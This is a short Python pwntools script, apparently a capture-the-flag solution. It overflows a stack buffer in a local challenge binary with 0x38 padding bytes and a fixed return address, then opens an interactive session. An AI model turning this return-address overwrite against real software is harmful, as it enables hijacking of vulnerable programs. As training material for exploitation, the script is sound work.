#!/usr/bin/env python3

from pwn import *

context.binary = "./chall"

LOCAL = 1

def main():
  t = None

  if LOCAL:
    t = process(context.binary.path)
  else:
    t = remote("localhost", 5000)

  p = b"A" * 0x38 + p64(0x401683)
  t.sendlineafter(b"Where should I try fishing instead?\n", p)
  t.interactive()

if __name__ == "__main__":
  main()
